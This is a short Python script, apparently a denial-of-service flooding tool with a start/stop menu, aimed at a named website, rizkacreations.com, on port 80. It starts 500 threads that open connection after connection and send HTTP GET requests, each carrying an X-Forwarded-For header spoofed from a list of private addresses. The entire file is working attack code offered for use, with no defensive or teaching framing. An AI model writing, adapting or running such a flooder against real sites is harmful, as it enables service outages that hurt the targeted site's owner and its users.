import socket
import threading
import random
import time

target = 'rizkacreations.com'
port = 80

# Define a list of fake IP addresses to use
fake_ips = ['192.168.0.1', '10.0.0.1', '172.16.0.1', '10.10.10.1']

# Define a global variable to track whether the attack is running or not
attack_running = False


def ddos():
    global attack_running
    while attack_running:
        fake_ip = random.choice(fake_ips)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.send(("GET / HTTP/1.1\r\n").encode('ascii'))
        s.send(("Host: " + target + "\r\n").encode('ascii'))
        s.send(("X-Forwarded-For: " + fake_ip + "\r\n\r\n").encode('ascii'))
        s.close()
        print("Request sent from " + fake_ip)


def start_attack():
    global attack_running
    attack_running = True
    print("Starting attack...")
    # Create multiple threads to send requests
    for i in range(500):
        thread = threading.Thread(target=ddos)
        thread.start()


def stop_attack():
    global attack_running
    attack_running = False
    print("Stopping attack...")


# Main menu loop
while True:
    print("\nDDoS Menu:")
    print("1. Start Attack")
    print("2. Stop Attack")
    print("3. Exit")
    choice = input("Enter your choice: ")
    if choice == "1":
        start_attack()
    elif choice == "2":
        stop_attack()
    elif choice == "3":
        print("Exiting...")
        break
    else:
        print("Invalid choice. Please try again.")
